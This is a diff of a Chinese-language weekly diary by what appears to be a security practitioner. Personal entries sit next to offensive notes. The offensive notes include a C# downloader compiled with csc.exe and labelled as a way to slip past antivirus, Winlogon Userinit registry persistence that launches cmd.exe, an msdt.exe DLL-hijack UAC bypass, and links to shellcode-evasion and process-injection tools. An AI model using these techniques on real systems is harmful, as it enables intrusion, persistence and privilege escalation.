@@ -743,7 +743,7 @@
 
 > 发薪日，沉淀，备考
 
-+ find / -type f -newermt '2024-05-07 01:00:00' ! -newermt '2024-05-07 02:00:00' 
++ find / -type f -newermt '2024-05-07 01:00:00' ! -newermt '2024-05-07 02:00:00'
   + useof find command to find files modified in a specific time range
 + 周三的时候遇到一个中建的人，借了1k给他，好家伙过去三天了还没联系我...电话也打不通，考虑报警了
   + 后续确认被骗了，共计1019元，吃一堑长一智，涉及到钱的都要谨慎，不要轻易借给别人，不要相信别人，不要相信别人，不要相信别人
@@ -831,6 +831,7 @@
 > 备考
 
 + https://mp.weixin.qq.com/s/hyP61MfRbpTjFMMl5MWqJg
++ 过杀软下载文件(.net nb!)
 + echo using System; using System.Net; using System.Text; >a.txt & echo class Program { static void Main(string[] a) { >>a.txt & echo try { string url = Encoding.UTF8.GetString(Convert.FromBase64String(a[0])); >>a.txt & echo new WebClient().DownloadFile(url, a[1]); Console.Write("1"); } catch { } } } >>a.txt
   C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /target:exe /out:C:\download.exe a.txt
   usage:download.exe base64edurl outpath
@@ -864,7 +865,6 @@
   + Set-ItemProperty   "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name   Userinit -value "C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe"
 + https://github.com/oski02/EarlyBirdAPC
 
-
 ## 第六十七周（2025.4.7-2025.4.13）
 
 > 当了一周的培训讲师，贵州真好
@@ -878,6 +878,7 @@
   + get the dll path to %path%
   + run c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes
   + UAC bypass
+
 ## 第六十八周（2025.4.14-2025.4.20）
 
 > 优化c2，学习
@@ -907,3 +908,40 @@
 + https://xz.aliyun.com/news/17739 MCP + IDA
 + iot pwn rce https://xz.aliyun.com/news/17717
 + https://github.com/miunasu/MemorySignatureLocate 利用卡巴定位自己shc的特征码
+
+## 第七十一周（2025.5.5-2025.5.11）
+
+> 兼职，比赛
+
++ 蓝桥省一，国赛不去了
++ 接了个兼职当老师
++ 这周一直在忙pycc
+
+## 第七十二周（2025.5.12-2025.5.18）
+
+> pycc
+
++ pycc终于结束了，三个赛项，估计一个国一两个国二？
++ pycc真是构思题目，年年改规则
+
+## 第七十三周（2025.5.19-2025.5.25）
+
+> 回家
+
++ 兼职结束了，打了个涉密的比赛，成绩全国前3吧，嘻嘻，爽爽的贵阳！
++ 买了30个esp07s小板的 type-c 下了血本 想自己开发近源工具！
+
+## 第七十四周（2025.5.26-2025.5.31）
+
+> 躺尸
+
++ 回家第二次考科目三过了！
+
+## 第七十五周（2025.6.1-2025.6.7）
+
+> 等国护，新电脑
+
++ 这周就能拿证了！
++ 一个好用的类wireshark工具 https://github.com/CuriousLearnerDev/TrafficEye/releases
++ 一个极低价格临时月付虚拟主机(限制端口数量) https://cloud.pasyun.com/
++ 买了个二手翼龙15pro 7940h+4070
